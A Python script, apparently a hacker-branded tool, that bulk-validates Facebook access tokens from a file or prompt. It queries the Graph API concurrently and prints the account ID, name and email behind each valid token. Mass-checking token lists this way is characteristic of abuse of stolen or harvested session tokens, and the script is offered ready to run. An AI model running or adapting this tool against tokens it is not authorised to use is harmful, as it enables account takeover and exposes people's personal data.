import requests
import time
import os
import threading
from platform import system
from colorama import Fore, Style, init

# Clear the terminal based on OS
def cls():
    if system() == 'Linux' or system() == 'Darwin':
        os.system('clear')
    elif system() == 'Windows':
        os.system('cls')

# Constants for colors and formatting
CLEAR_SCREEN = '\033[2J'
RED = '\033[1;31m'
RESET = '\033[0m'
GREEN = '\033[1;32m'
BLUE = "\033[1;34m"
YELLOW = "\033[1;33m"
CYAN = "\033[1;36m"

cls()
time.sleep(1)
os.system('clear')
logo = ("""
          
 \033[1;31m_______  _       _________ _______          
\033[1;36m(  ___  )( (    /|\__   __/(  ____ \|\     /|
\033[1;33m| (   ) ||  \  ( |   ) (   | (    \/| )   ( |
\033[1;31m| (___) ||   \ | |   | |   | (_____ | (___) |
\033[1;36m|  ___  || (\ \) |   | |   (_____  )|  ___  |
\033[1;31m| (   ) || | \   |   | |         ) || (   ) |
\033[1;37m| )   ( || )  \  |___) (___/\____) || )   ( |
\033[1;36m|/     \||/    )_)\_______/\_______)|/     \|
                                                                                                    
\033[1;36m╔═══════════════════════════════════════════════════╗
\033[1;36m║  \033[1;33mN4M3       \033[1;39m━▷ \033[1;32m𝐀𝐍𝐈𝐒𝐇_𝐗𝐃                   
\033[1;36m║  \033[1;33mRULL3X     \033[1;39m━▷ \033[1;32m𝐀𝐋𝐎𝐍𝐄 𝐒𝐓𝐀𝐍𝐃
\033[1;36m║  \033[1;33mTOOL       \033[1;39m━▷ \033[1;32m𝐓𝐎𝐊𝐄𝐍 𝐕𝐀𝐋𝐈𝐃𝐈𝐓𝐘 𝐂𝐇𝐄𝐂𝐊𝐄𝐑
\033[1;36m║  \033[1;33mBR9ND      \033[1;39m━▷ \033[1;32m𝐀𝐍𝐈𝐒𝐇 𝐈𝐒 𝐇𝐄𝐑𝐄
\033[1;36m║  \033[1;33mGitHub     \033[1;39m━▷ \033[1;32m(https://github.com/Anish_xd20)
\033[1;36m║  \033[1;33mWHATSAP    \033[1;39m━▷ \033[1;32m(+977981759961)
\033[1;36m╚═══════════════════════════════════════════════════╝
""")
# Print the logo
print(Fore.CYAN + logo + Style.RESET_ALL)
# Start time
print('\u001b[37m' + '\x1b[1;37m======================================================>>')
print("\033[92mStart Time:", time.strftime("%Y-%m-%d %H:%M:%S"))
print('\u001b[37m' + '\x1b[1;37m======================================================>>')

# Function to load tokens from a file
def load_tokens(filename):
    tokens = []
    try:
        with open(filename, 'r') as f:
            tokens = [line.strip() for line in f.readlines()]
    except FileNotFoundError:
        print(f"{RED}[!] Token file not found!{RESET}")
    return tokens

# Function to check a single token
def check_token(token):
    url = f'https://graph.facebook.com/me?access_token={token}&fields=id,name,email'
    try:
        response = requests.get(url)
        if response.status_code == 200:
            data = response.json()
            user_id = data.get('id')
            name = data.get('name')
            email = data.get('email', 'Email not available')

            print(f"{GREEN}[+] Token: {token}")
            print(f"{GREEN}[+] User ID: {user_id}")
            print(f"{GREEN}[+] Name: {name}")
            print(f"{GREEN}[+] Email: {email}")
            print(f"{GREEN}[+] Thread ID: {user_id} (Same as User ID){RESET}")
        else:
            print(f"{RED}[+] Token: {token}")
            print(f"{RED}[+] Error: {response.status_code}")
            print(f"{RED}[+] Token Expired or Invalid{RESET}")
    except Exception as e:
        print(f"{RED}[+] Error checking token: {e}{RESET}")

# Function to check tokens using threading
def check_tokens_from_file(filename):
    tokens = load_tokens(filename)
    if not tokens:
        print(f"{RED}[!] No tokens found in the file.{RESET}")
        return

    print(f"{YELLOW}[+] Checking {len(tokens)} tokens...{RESET}")
    threads = []
    for token in tokens:
        thread = threading.Thread(target=check_token, args=(token,))
        threads.append(thread)
        thread.start()

    # Wait for all threads to complete
    for thread in threads:
        thread.join()

# Function to check a single token directly
def check_single_token():
    token = input(f"{CYAN}[+] Enter the token to check: {RESET}")
    check_token(token)

# Main function
def main():
    print(f"{CYAN}[1] Check a single token")
    print(f"{CYAN}[2] Check tokens from a file{RESET}")
    choice = input(f"{CYAN}[+] Enter your choice (1 or 2): {RESET}")

    if choice == '1':
        check_single_token()
    elif choice == '2':
        file_path = input(f"{CYAN}[+] Enter the path to the token file: {RESET}")
        check_tokens_from_file(file_path)
    else:
        print(f"{RED}[!] Invalid choice. Please try again.{RESET}")

if __name__ == "__main__":
    main()
